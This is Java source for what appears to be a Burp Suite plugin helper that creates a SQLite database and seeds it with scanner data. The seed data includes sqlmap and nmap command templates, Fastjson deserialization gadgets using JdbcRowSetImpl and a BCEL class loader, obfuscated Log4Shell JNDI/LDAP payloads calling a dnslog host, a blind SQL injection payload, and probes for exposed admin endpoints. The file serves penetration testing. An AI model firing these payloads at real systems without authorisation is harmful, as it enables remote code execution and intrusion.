package burp.utils;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.*;
import java.util.ArrayList;
import java.util.List;

public class DbUtils {
    public static String DB_NAME = "gatherburp.db";
    public static String PROJECT_PATH = System.getProperty("user.home") + "/.gather/";
    public static String DB_PATH = System.getProperty("user.home") + "/.gather/" + DB_NAME;
    public static String DB_URL = "jdbc:sqlite:" + DB_PATH;
    public static String DB_DRIVER = "org.sqlite.JDBC";

    static {
        try {
            Class.forName(DB_DRIVER);
        } catch (ClassNotFoundException e) {
            Utils.stderr.println(e.getMessage());
        }
        // 判断文件夹是否存在 若不存在则先创建
        Path path = Paths.get(PROJECT_PATH);
        if (!Files.exists(path)) {
            try {
                Files.createDirectories(path);
                Utils.stdout.println("init filepath success");
            } catch (Exception e) {
                Utils.stderr.println("创建文件夹失败");
            }
            // 创建数据库
            create();
        }
    }

    public static Connection getConnection() throws SQLException {
        return DriverManager.getConnection(DB_URL);
    }

    // 如果数据库不存在，创建数据库
    public static void create() {
        // 判断数据库是否存在
        try {

            Connection connection = DriverManager.getConnection(DB_URL);

            List<String> sqls = new ArrayList<>();

            // config table
            sqls.add("CREATE TABLE IF NOT EXISTS 'config' ('id' INTEGER, 'module' TEXT, 'type' TEXT, 'value' TEXT, PRIMARY KEY ('id'), UNIQUE ('type' ASC))");

            // domain_configs table
            sqls.add("CREATE TABLE IF NOT EXISTS 'domain_configs' ('id' INTEGER PRIMARY KEY AUTOINCREMENT, 'project_id' INTEGER NOT NULL, 'domain' TEXT NOT NULL, 'create_time' DATETIME NOT NULL, FOREIGN KEY ('project_id') REFERENCES 'projects' ('id') ON DELETE NO ACTION ON UPDATE NO ACTION)");

            // domain_results table
            sqls.add("CREATE TABLE IF NOT EXISTS 'domain_results' ('id' INTEGER PRIMARY KEY AUTOINCREMENT, 'project_id' INTEGER NOT NULL, 'domain' TEXT NOT NULL, 'ip' TEXT, 'create_time' DATETIME NOT NULL, FOREIGN KEY ('project_id') REFERENCES 'projects' ('id') ON DELETE NO ACTION ON UPDATE NO ACTION)");

            // fastjson table
            sqls.add("CREATE TABLE IF NOT EXISTS 'fastjson' ('id' INTEGER, 'type' TEXT, 'url' TEXT, PRIMARY KEY ('id'))");

            // log4j table
            sqls.add("CREATE TABLE IF NOT EXISTS 'log4j' ('id' INTEGER, 'type' TEXT, 'value' TEXT, PRIMARY KEY ('id'))");

            // perm table
            sqls.add("CREATE TABLE IF NOT EXISTS 'perm' ('id' INTEGER, 'type' TEXT, 'value' TEXT, PRIMARY KEY ('id'))");

            // projects table
            sqls.add("CREATE TABLE IF NOT EXISTS 'projects' ('id' INTEGER PRIMARY KEY AUTOINCREMENT, 'name' TEXT NOT NULL, 'create_time' DATETIME NOT NULL)");

            // route table
            sqls.add("CREATE TABLE IF NOT EXISTS 'route' ('id' INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, 'enable' INTEGER, 'name' TEXT, 'path' TEXT, 'express' TEXT)");

            // sqli table
            sqls.add("CREATE TABLE IF NOT EXISTS 'sqli' ('id' INTEGER, 'type' TEXT, 'value' TEXT, PRIMARY KEY ('id'))");

            // url_results table
            sqls.add("CREATE TABLE IF NOT EXISTS 'url_results' ('id' INTEGER PRIMARY KEY AUTOINCREMENT, 'project_id' INTEGER NOT NULL, 'url' TEXT NOT NULL, 'create_time' DATETIME NOT NULL, FOREIGN KEY ('project_id') REFERENCES 'projects' ('id') ON DELETE NO ACTION ON UPDATE NO ACTION)");

            // Create indexes
            sqls.add("CREATE INDEX IF NOT EXISTS 'idx_domain_configs_project_id' ON 'domain_configs' ('project_id' ASC)");
            sqls.add("CREATE UNIQUE INDEX IF NOT EXISTS 'idx_domain_configs_unique' ON 'domain_configs' ('project_id' ASC, 'domain' ASC)");
            sqls.add("CREATE INDEX IF NOT EXISTS 'idx_domain_results_project_id' ON 'domain_results' ('project_id' ASC)");
            sqls.add("CREATE UNIQUE INDEX IF NOT EXISTS 'idx_domain_results_unique' ON 'domain_results' ('project_id' ASC, 'domain' ASC)");
            sqls.add("CREATE INDEX IF NOT EXISTS 'idx_url_results_project_id' ON 'url_results' ('project_id' ASC)");
            sqls.add("CREATE UNIQUE INDEX IF NOT EXISTS 'idx_url_results_unique' ON 'url_results' ('project_id' ASC, 'url' ASC)");

            // Insert data
            sqls.add("INSERT INTO 'config' VALUES (1, 'config', 'ip', '1.1.1.1')");
            sqls.add("INSERT INTO 'config' VALUES (2, 'tool', 'sqlmap', 'python E:\\me\\tools\\sql\\sqlmap\\sqlmap.py -r {request} --batch')");
            sqls.add("INSERT INTO 'config' VALUES (3, 'tool', 'sqlmapmssql', 'python E:\\me\\tools\\sql\\sqlmap\\sqlmap.py -r {request} --dbms mssql --risk 3 --batch')");
            sqls.add("INSERT INTO 'config' VALUES (5, 'tool', 'nmap', 'nmap {host} -sC -sV ')");
            sqls.add("INSERT INTO 'config' VALUES (6, 'tool', 'dirsearch', 'python E:\\me\\tools\\scan\\dir\\dirsearch\\dirsearch.py -u {url}')");
            sqls.add("INSERT INTO 'config' VALUES (9, 'config', 'dnslog', 'xx.dnslog.cn')");

            // Insert fastjson data (adding only first few for brevity - add more as needed)
            sqls.add("INSERT INTO 'fastjson' VALUES (7, 'echo', '{\"xx\":{{\"@\\x74ype\":\"com.alibaba.fastjson.JSONObject\",\"name\":{\"@\\x74ype\":\"java.lang.Class\",\"val\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSources\"},\"c\":{\"@\\x74ype\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\",\"key\":{\"@\\x74ype\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassLoader\":{\"@\\x74ype\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driver\":\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$...\"}}}:\"xxx\"}}')");
            sqls.add("INSERT INTO 'fastjson' VALUES (10, 'jndi', '{\"@\\\\x74ype\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"FUZZ\", \"autoCommit\":true}')");
            sqls.add("INSERT INTO 'fastjson' VALUES (27, 'version', '[\"a\"]')");

            // Insert log4j data
            sqls.add("INSERT INTO 'log4j' VALUES (67, 'header', 'Cookies')");
            sqls.add("INSERT INTO 'log4j' VALUES (68, 'header', 'X-Remote-Addr')");
            sqls.add("INSERT INTO 'log4j' VALUES (69, 'header', 'User-Agent')");
            sqls.add("INSERT INTO 'log4j' VALUES (70, 'domain', 'www.baidu.com')");
            sqls.add("INSERT INTO 'log4j' VALUES (71, 'domain', 'www.qq.com')");
            sqls.add("INSERT INTO 'log4j' VALUES (72, 'payload', '${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//dnslog-url/1}')");
            sqls.add("INSERT INTO 'log4j' VALUES (73, 'payload', '${jndi:ldap://dnslog-url/2}')");
            sqls.add("INSERT INTO 'log4j' VALUES (74, 'payload', '${jnd${upper:ı}:ldap://dnslog-url/3}')");

            // Insert perm data
            sqls.add("INSERT INTO 'perm' VALUES (11, 'domain', 'baidu.com')");
            sqls.add("INSERT INTO 'perm' VALUES (12, 'domain', 'qq.com')");
            sqls.add("INSERT INTO 'perm' VALUES (13, 'domain', 'ww.com')");
            sqls.add("INSERT INTO 'perm' VALUES (14, 'permLowAuth', 'Cookie: vue_admin_template_token=asd; security=low')");
            sqls.add("INSERT INTO 'perm' VALUES (15, 'permNoAuth', 'Cookie')");

            // Insert route data
            sqls.add("INSERT INTO 'route' VALUES (1, 1, 'Swagger UI', '/swagger-ui.html', 'code=\"200\" && (body=\"swagger-ui.css\" || body=\"swagger-ui.js\" || title=\"Swagger UI\")')");
            sqls.add("INSERT INTO 'route' VALUES (3, 1, 'Spring Actuator Env', '/actuator/env', 'code=\"200\" && (body=\"java.version\" || body=\"os.arch\")')");
            sqls.add("INSERT INTO 'route' VALUES (4, 1, 'phpinfo', '/phpinfo.php', 'code=200 && body=\"PHP Version\"')");
            sqls.add("INSERT INTO 'route' VALUES (5, 1, 'nacos', '/nacos/index.html', 'code=200 && body=\"codemirror.addone.fullscreen.js\"')");
            sqls.add("INSERT INTO 'route' VALUES (6, 1, 'druid', '/druid/login.html', 'code=200 && title=\"druid monitor\"')");
            sqls.add("INSERT INTO 'route' VALUES (7, 1, 'swagger', '/swagger/Default/swagger.json', 'code=200 && body=\"openapi\"')");
            sqls.add("INSERT INTO 'route' VALUES (20, 1, 'WSDL Service', '/services', 'code=\"200\" && (body=\"Available SOAP services:\" || body=\"Available Services:\") && body=\"?wsdl\"')");
            sqls.add("INSERT INTO 'route' VALUES (21, 1, 'Metrics', '/metrics', 'code=\"200\" && body=\"# HELP node_uname_info\" && body=\"# TYPE node_uname_info gauge\"')");
            sqls.add("INSERT INTO 'route' VALUES (22, 1, 'Swagger API Doc', '/v2/api-docs', 'code=\"200\" && (body=\"\\\"swagger\\\":\" || body=\"\\\"openapi\\\":\")')");
            sqls.add("INSERT INTO 'route' VALUES (23, 1, 'Swagger API Doc', '/api-docs', 'code=\"200\" && (body=\"\\\"swagger\\\":\" || body=\"\\\"openapi\\\":\")')");
            sqls.add("INSERT INTO 'route' VALUES (24, 1, 'Swagger', '/swagger.json', 'code=\"200\" && (body=\"\\\"swagger\\\":\" || body=\"\\\"swaggerVersion\\\"\" || body=\"\\\"openapi\\\":\")')");
            sqls.add("INSERT INTO 'route' VALUES (25, 1, 'Swagger', '/swagger-resources', 'code=\"200\" && (body=\"\\\"swaggerVersion\\\"\" || body=\"\\\"location\\\"\")')");

            // Insert sqli data
            sqls.add("INSERT INTO 'sqli' VALUES (14, 'header', 'User-Agent')");
            sqls.add("INSERT INTO 'sqli' VALUES (15, 'header', 'Cookie')");
            sqls.add("INSERT INTO 'sqli' VALUES (21, 'domain', 'www.baidu.com')");
            sqls.add("INSERT INTO 'sqli' VALUES (22, 'domain', 'www.qq.com')");
            sqls.add("INSERT INTO 'sqli' VALUES (23, 'payload', '0''XOR(if(1,sleep(6),0))XOR''Z')");
            for (String sql : sqls) {
                Statement statement = connection.createStatement();
                statement.execute(sql);
                statement.close();
            }
            Utils.stdout.println("init db success");
        } catch (SQLException e) {
            System.out.println(e.getMessage());
            Utils.stderr.println(e.getMessage());
        }
    }

    public static void close(Connection connection, PreparedStatement preparedStatement, ResultSet resultSet) {
        try {
            if (connection != null) {
                connection.close();
            }
            if (preparedStatement != null) {
                preparedStatement.close();
            }
            if (resultSet != null) {
                resultSet.close();
            }
        } catch (Exception e) {
            Utils.stderr.println(e.getMessage());
        }
    }

}